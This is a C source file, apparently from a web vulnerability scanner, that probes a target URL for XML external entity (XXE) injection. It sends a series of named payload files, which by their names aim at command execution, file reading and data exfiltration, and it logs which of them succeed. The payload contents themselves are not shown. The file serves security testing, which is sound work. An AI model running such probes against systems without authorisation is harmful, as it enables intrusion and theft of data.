#include "../../global.h"
#include "../../util/util.h"
#include "../../http/http.h"
#include "xxe.h"

static int check_xml(char *target_url){
    request r = {0};
    int rc = http_send_post(&r, target_url, true, "/usr/share/sentinel/glassworm/XXE/test.xml", false, NULL);
    FILE *file = fopen(r.filename, "r");
    if (!file) {
        return 1;
    }
    
    char buffer[1024];
    while(fgets(buffer, sizeof(buffer), file) != NULL) {
        if (strstr(buffer, "Unsupported Media Type") || r.code == 415) {
            return 1;
        } else if (strstr(buffer, "XMLSyntaxError") || strstr(buffer, "SAXParseException")) {
            return -1;
        } else if (r.code == 200) {
            return 0;
        }
    }
    fclose(file);
    return 0;
}

static int confirm_xxe(char *target_url , char *output_dir) {
    request r[5] = {0};

    char output_path[2048];
    snprintf(output_path, sizeof(output_path), "%s/xxe_results.txt", output_dir);
    FILE *fp = fopen(output_path, "w");
    if (!fp) {
        fprintf(stderr, "[-] cannot write xxe_results.txt: %s\n", strerror(errno));
        fclose(fp);
        return 1;
    }
    int rc = http_send_post(&r[0], target_url, true, "/usr/share/sentinel/glassworm/XXE/request.xml", false, NULL);
    if (r[0].code == 200 && rc == 0) {
        printf("[xxe] XXE vulnerability confirmed on %s with payload request.xml\n", target_url);
        fprintf(fp, "[xxe] XXE vulnerability confirmed on %s with payload request.xml\n", target_url);
    }

    rc = http_send_post(&r[1], target_url, true, "/usr/share/sentinel/glassworm/XXE/command.xml", false, NULL);
    if (r[1].code == 200 && rc == 0) {
        printf("[xxe] XXE vulnerability confirmed on %s with payload command.xml\n", target_url);
        fprintf(fp, "[xxe] XXE vulnerability confirmed on %s with payload command.xml\n", target_url);
    }

    rc = http_send_post(&r[2], target_url, true, "/usr/share/sentinel/glassworm/XXE/file.xml", false, NULL);
    if (r[2].code == 200 && rc == 0) {
        printf("[xxe] XXE vulnerability confirmed on %s with payload file.xml\n", target_url);
        fprintf(fp, "[xxe] XXE vulnerability confirmed on %s with payload file.xml\n", target_url);
    }

    rc = http_send_post(&r[3], target_url, true, "/usr/share/sentinel/glassworm/XXE/exfil_command.xml", false, NULL);
    if (r[3].code == 200 && rc == 0) {
        printf("[xxe] XXE vulnerability confirmed on %s with payload exfil_command.xml\n", target_url);
        fprintf(fp, "[xxe] XXE vulnerability confirmed on %s with payload exfil_command.xml\n", target_url);
    }

    rc = http_send_post(&r[4], target_url, true, "/usr/share/sentinel/glassworm/XXE/exfil_file.xml", false, NULL);
    if (r[4].code == 200 && rc == 0) {
        printf("[xxe] XXE vulnerability confirmed on %s with payload exfil_file.xml\n", target_url);
        fprintf(fp, "[xxe] XXE vulnerability confirmed on %s with payload exfil_file.xml\n", target_url);
    }
    fclose(fp);
    return 0;
}

int xxe(char *target_url, char *output_dir) {
    int rc = check_xml(target_url);
    if (rc == 1) {
        printf("[xxe] The target does not accept XML input.\n");
        return 1;
    } else if (rc == -1) {
        printf("[xxe] XML parsing error detected.\n");
        return 1;
    } else if (rc == 0) {
        printf("[xxe] XML exists.\n");
        confirm_xxe(target_url, output_dir);
    }
    request r = {0};
    rc = http_send_post(&r, target_url, true, "/usr/share/sentinel/glassworm/XXE/remote.xml", false, NULL);
    request_free(&r);

    return 0;
}